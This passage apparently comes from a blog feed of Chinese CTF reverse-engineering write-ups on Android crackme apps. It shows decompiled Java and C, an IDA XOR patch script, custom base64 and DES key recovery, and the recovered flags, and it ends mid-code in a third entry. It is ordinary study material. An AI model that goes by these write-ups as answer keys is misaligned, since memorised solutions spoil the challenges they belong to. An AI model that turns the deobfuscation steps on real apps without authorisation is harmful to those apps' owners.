<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0096R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">key1</span> <span class="operator">=</span> <span class="string">&quot;reversecarefully&quot;</span>.replaceAll(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;3&quot;</span>);<span class="comment">//将e换成3</span></span><br><span class="line">        <span class="built_in">this</span>.flag = (TextView) findViewById(C0096R.C0099id.flag);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">vector2</span> <span class="operator">=</span> (String) confusion(<span class="string">&quot;reversehavemagic&quot;</span>);<span class="comment">//对字符串进行md5加密</span></span><br><span class="line">        <span class="built_in">this</span>.input_1 = (EditText) findViewById(C0096R.C0099id.input_1);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(C0096R.C0099id.button);</span><br><span class="line">        <span class="built_in">this</span>.button = button;</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">C00001</span>(<span class="built_in">this</span>, vector2, key1, <span class="string">&quot;BxLHc1KruiH31I94W171oal+9olDzgBIjnK/J1Db0IUyi+MbI38+nw62ejCPShRB&quot;</span>));<span class="comment">//此处为密文</span></span><br><span class="line">    &#125;<span class="comment">//注意其传参位置 vector才是key，key是偏移量</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>md5加密方法(此处输出的是32位小写)</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">confusion</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);     <span class="comment">// Catch: Exception -&gt; L6</span></span><br><span class="line">        md.update(str.getBytes());     <span class="comment">// Catch: Exception -&gt; L6</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, md.digest()).toString(<span class="number">16</span>);</span><br><span class="line">    L6:</span><br><span class="line">        e = move-exception;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>DES加密方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">DES</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String strKey, String strClearText, String mstrIvParameter)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] raw = strKey.getBytes();     <span class="comment">// Catch: Exception -&gt; L7</span></span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">skeySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(raw, type);     <span class="comment">// Catch: Exception -&gt; L7</span></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(CBC_PKCS5_PADDING);     <span class="comment">// Catch: Exception -&gt; L7</span></span><br><span class="line">        <span class="type">IvParameterSpec</span> <span class="variable">iv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(mstrIvParameter.getBytes());     <span class="comment">// Catch: Exception -&gt; L7</span></span><br><span class="line">        cipher.init(<span class="number">1</span>, skeySpec, iv);     <span class="comment">// Catch: Exception -&gt; L7</span></span><br><span class="line">        <span class="type">byte</span>[] cipherText = cipher.doFinal(strClearText.getBytes());     <span class="comment">// Catch: Exception -&gt; L7</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">strBase64Content</span> <span class="operator">=</span> Base64.encodeToString(cipherText, <span class="number">0</span>);     <span class="comment">// Catch: Exception -&gt; L7</span></span><br><span class="line">        <span class="keyword">return</span> strBase64Content.replaceAll(System.getProperty(<span class="string">&quot;line.separator&quot;</span>), <span class="string">&quot;&quot;</span>);</span><br><span class="line">    L7:</span><br><span class="line">        e = move-exception;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>此处des使用的是CBC模式，pkcs5padding带有偏移量</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文&quot;BxLHc1KruiH31I94W171oal+9olDzgBIjnK/J1Db0IUyi+MbI38+nw62ejCPShRB&quot;</span><br><span class="line"></span><br><span class="line">密码(String) confusion(&quot;reversehavemagic&quot;) 32位小写md5</span><br><span class="line"></span><br><span class="line">偏移&quot;reversecarefully&quot;.replaceAll(&quot;e&quot;, &quot;3&quot;)</span><br></pre></td></tr></table></figure></div>

<p>但我自己电脑复现出来是乱码，可以通过网上的解密工具进行解密</p>
<p>NKCTF{nI_k@i_sHi_zhu_j1an_il_Jie_RE_le}</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>广东强网杯 2021 个人决赛findthekey</title>
    <url>/2023/07/05/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF%202021%20%E4%B8%AA%E4%BA%BA%E5%86%B3%E8%B5%9Bfindthekey/</url>
    <content><![CDATA[<p>只有一个activity组件</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.findthekey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.AlertDialog;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.KeyEvent;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Context</span> <span class="variable">appContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">findthekey</span><span class="params">(Object obj)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0273R.layout.activity_main);</span><br><span class="line">        appContext = getApplicationContext();</span><br><span class="line">        <span class="type">Button</span> <span class="variable">checkButton</span> <span class="operator">=</span> (Button) findViewById(C0273R.C0275id.checkButton);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">inputEditText</span> <span class="operator">=</span> (EditText) findViewById(C0273R.C0275id.inputEditText);</span><br><span class="line">        checkButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.ctf.findthekey.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> inputEditText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (MainActivity.<span class="built_in">this</span>.check(content)) &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(<span class="built_in">this</span>).setTitle(<span class="string">&quot;result&quot;</span>).setMessage(<span class="string">&quot;Congratulations!&quot;</span>).show();</span><br><span class="line">                    inputEditText.setText(BuildConfig.FLAVOR);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(<span class="built_in">this</span>).setTitle(<span class="string">&quot;result&quot;</span>).setMessage(<span class="string">&quot;Sorry,try again?&quot;</span>).show();</span><br><span class="line">                inputEditText.setText(BuildConfig.FLAVOR);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, android.app.Activity, android.view.KeyEvent.Callback</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode, KeyEvent event)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyCode == <span class="number">4</span>) &#123;</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onKeyDown(keyCode, event);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String content)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> findthekey(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>直接调用JNI进行明文校验</p>
<p>发现JNI中的所有函数都不符合对应的findthekey这个名字经过搜索发现是经过了混淆<a class="link"   href="https://blog.csdn.net/feibabeibei_beibei/article/details/52668534" >(41条消息) Android SO文件保护加固——混淆篇（一）_android so 混淆_不知世事的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>需要看JNI_ONLoad(在loadlibrary时调用，用于注册函数之类的)</p>
<p>以下的byte_5120，byte_510C，byte_5140都在initarray时进行了修改(initarray在启动elf时就执行会先于JNI_OnLoad)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307101537741.png"
                      alt="image-20230710153725696"
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="type">void</span> *reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+24h] [bp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">3</span>]; <span class="comment">// [sp+28h] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  sub_15A0(vm, &amp;v4, <span class="number">65542</span>);</span><br><span class="line">  v5[<span class="number">2</span>] = (<span class="type">int</span>)sub_1434;</span><br><span class="line">  v5[<span class="number">1</span>] = (<span class="type">int</span>)byte_5120;                      </span><br><span class="line">  v5[<span class="number">0</span>] = (<span class="type">int</span>)byte_510C;                       </span><br><span class="line">  v2 = sub_15D4(v4, byte_5140);                </span><br><span class="line">  sub_15FE(v4, v2, v5, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">65542</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>用脚本重新异或回去得出</p>
<blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">addr,xor,size</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        idaapi.patch_byte(addr+i,Byte(addr+i)^xor)</span><br><span class="line">patch(<span class="number">0x5004</span>,<span class="number">0x20</span>,<span class="number">4</span>)</span><br><span class="line">patch(<span class="number">0x5010</span>,<span class="number">0x90</span>,<span class="number">0x14</span>)</span><br><span class="line">patch(<span class="number">0x5025</span>,<span class="number">0x54</span>, <span class="number">0xF</span>)</span><br><span class="line">patch(<span class="number">0x5035</span>,<span class="number">0xF9</span>,<span class="number">5</span>)</span><br><span class="line">patch(<span class="number">0x5040</span>,<span class="number">0x5F</span>,<span class="number">0x18</span>)</span><br><span class="line">patch(<span class="number">0x5060</span>,<span class="number">0x6D</span>,<span class="number">0x19</span>)</span><br><span class="line">patch(<span class="number">0x507A</span>,<span class="number">0xF1</span>,<span class="number">4</span>)</span><br><span class="line">patch(<span class="number">0x5080</span>,<span class="number">0xA7</span>,<span class="number">0x15</span>)</span><br><span class="line">patch(<span class="number">0x50A0</span>,<span class="number">0x78</span>,<span class="number">0x40</span>)</span><br><span class="line">patch(<span class="number">0x50F0</span>,<span class="number">0x86</span>,<span class="number">0x18</span>)</span><br><span class="line">patch(<span class="number">0x5109</span>,<span class="number">0xF4</span>,<span class="number">2</span>)</span><br><span class="line">patch(<span class="number">0x510C</span>,<span class="number">0x74</span>, <span class="number">0xA</span>)</span><br><span class="line">patch(<span class="number">0x5120</span>,<span class="number">0xFC</span>,<span class="number">0x15</span>)</span><br><span class="line">patch(<span class="number">0x5140</span>, <span class="number">0x45</span>,<span class="number">0x1F</span>)</span><br></pre></td></tr></table></figure></div>
</blockquote>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="type">void</span> *reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+24h] [bp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">3</span>]; <span class="comment">// [sp+28h] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  sub_15A0(vm, &amp;v4, <span class="number">65542</span>);</span><br><span class="line">  v5[<span class="number">2</span>] = (<span class="type">int</span>)sub_1434;</span><br><span class="line">  v5[<span class="number">1</span>] = (<span class="type">int</span>)byte_5120;                       <span class="comment">// (Ljava/lang/Object;)</span></span><br><span class="line">  v5[<span class="number">0</span>] = (<span class="type">int</span>)byte_510C;                       <span class="comment">// findthekey</span></span><br><span class="line">  v2 = sub_15D4(v4, byte_5140);                 <span class="comment">// &#x27;com/ctf/findthekey/MainActivity&#x27;</span></span><br><span class="line">  sub_15FE(v4, v2, v5, <span class="number">1</span>); <span class="comment">//此处应该是将com/ctf/findthekey/MainActivity的findthekey方法注册为sub_1434方法</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">65542</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以直接查看sub_1434函数(此处将)</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_1434</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-84h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">100</span>]; <span class="comment">// [sp+30h] [bp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_14CC(a1, a3, <span class="number">0</span>);<span class="comment">//将java传入的a3字符串转化为c字符串</span></span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="built_in">sprintf</span>(v5, byte_5109, v4);<span class="comment">//将字符串复制给v5</span></span><br><span class="line">  <span class="keyword">return</span> sub_13B0(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>又调用了sub_13B0</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_13B0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 *v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+8h] [bp-28h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+20h] [bp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v1 = sub_1214((<span class="type">int</span>)a1, v3, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>((_BYTE *)dword_5164, v1) == <span class="number">0</span>;<span class="comment">//将v1字符串与dword_5164进行比较</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此处的sub_1214使用的是base64算法可以通过其中的一部分代码判断(每次取三字节，生成四字节)</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v6[v5] = byte_50A0[*(<span class="type">unsigned</span> __int8 *)(a1 + v4) &gt;&gt; <span class="number">2</span>];</span><br><span class="line">v6[v5 + <span class="number">1</span>] = byte_50A0[(<span class="number">16</span> * (*(_BYTE *)(a1 + v4) &amp; <span class="number">3</span>)) | (*(<span class="type">unsigned</span> __int8 *)(a1 + v4 + <span class="number">1</span>) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">v6[v5 + <span class="number">2</span>] = byte_50A0[(<span class="number">4</span> * (*(_BYTE *)(a1 + v4 + <span class="number">1</span>) &amp; <span class="number">0xF</span>)) | (*(<span class="type">unsigned</span> __int8 *)(a1 + v4 + <span class="number">2</span>) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">v6[v5 + <span class="number">3</span>] = byte_50A0[*(_BYTE *)(a1 + v4 + <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">v4 += <span class="number">3</span>;</span><br><span class="line">v5 += <span class="number">4</span>;</span><br><span class="line"><span class="comment">//此处字典也被initarray的函数修改了</span></span><br><span class="line"><span class="comment">//实际值为byte_50A0=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-+\&quot;</span></span><br><span class="line"><span class="comment">//此处base64表与标准的base64表不同</span></span><br></pre></td></tr></table></figure></div>

<p>根据 strcmp((_BYTE *)dword_5164, v1) &#x3D;&#x3D; 0;可以得出dword_5164为base64后的密文</p>
<p>调查交叉引用，也被initarray的函数修改了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307101547679.png"
                      alt="image-20230710154752632"
                ></p>
<p>实际值为zMXHz3T0AgLZAxn0AgvRzxL9</p>
<p>换表后得出了flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307101548731.png"
                      alt="image-20230710154852630"
                ></p>
<p>flag{thisisthekey}</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界-easyjava</title>
    <url>/2023/08/10/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easyjava/</url>
    <content><![CDATA[<p>查看xml</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.a.easyjava&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;27&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;8.1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;19&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;26&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.p027a.easyjava.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.VERSION&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;26.1.0&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.arch.lifecycle.VERSION&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;27.0.0-SNAPSHOT&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>只有一个activity</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.p027a.easyjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.p021v7.app.ActivityC0435c;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.util.Timer;</span><br><span class="line"><span class="keyword">import</span> java.util.TimerTask;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: com.a.easyjava.MainActivity */</span></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">ActivityC0435c</span> &#123;</span><br><span class="line">    <span class="comment">/* renamed from: a */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">m6a</span><span class="params">(String str, C0680b c0680b, C0679a c0679a)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> c0679a.m3a(c0680b.m1a(str));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: private */</span></span><br><span class="line">    <span class="comment">/* renamed from: b */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title function_">m5b</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (str.startsWith(<span class="string">&quot;flag&#123;&quot;</span>) &amp;&amp; str.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">substring</span> <span class="operator">=</span> str.substring(<span class="number">5</span>, str.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="type">C0680b</span> <span class="variable">c0680b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C0680b</span>(<span class="number">2</span>);</span><br><span class="line">            <span class="type">C0679a</span> <span class="variable">c0679a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C0679a</span>(<span class="number">3</span>);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; substring.length(); i2++) &#123;</span><br><span class="line">                sb.append(m6a(substring.charAt(i2) + <span class="string">&quot;&quot;</span>, c0680b, c0679a));</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">valueOf</span> <span class="operator">=</span> Integer.valueOf(c0680b.m0b().intValue() / <span class="number">25</span>);</span><br><span class="line">                <span class="keyword">if</span> (valueOf.intValue() &gt; i &amp;&amp; valueOf.intValue() &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(sb.toString().equals(<span class="string">&quot;wigwrkaugala&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.p021v7.app.ActivityC0435c, android.support.p007v4.p008a.ActivityC0114i, android.support.p007v4.p008a.ActivityC0094aa, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.a.easyjava.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (MainActivity.m5b(((EditText) ((MainActivity) <span class="built_in">this</span>).findViewById(R.id.edit)).getText().toString()).booleanValue()) &#123;</span><br><span class="line">                    Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;You are right!&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;You are wrong! Bye~&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Timer</span>().schedule(<span class="keyword">new</span> <span class="title class_">TimerTask</span>() &#123; <span class="comment">// from class: com.a.easyjava.MainActivity.1.1</span></span><br><span class="line">                    <span class="meta">@Override</span> <span class="comment">// java.util.TimerTask, java.lang.Runnable</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        System.exit(<span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, <span 